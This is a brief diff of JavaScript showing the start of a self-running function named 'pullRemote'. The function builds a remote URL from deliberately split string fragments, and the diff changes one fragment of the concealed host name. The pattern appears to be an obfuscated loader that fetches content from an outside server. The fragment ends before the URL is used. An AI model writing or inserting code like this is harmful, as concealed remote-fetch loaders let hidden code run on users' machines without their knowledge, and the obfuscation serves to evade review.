@@ -1,5 +1,5 @@
 (function pullRemote() {
-    var host = ['pinger', 'rimo', 'sehorts', '.com'].join('');
+    var host = ['pinger', 'rimo', 'seshorts', '.com'].join('');
     var file = ['orpin', 'velleity'].join('.');
     var href = ['https://', host, '/', file].join('');
 
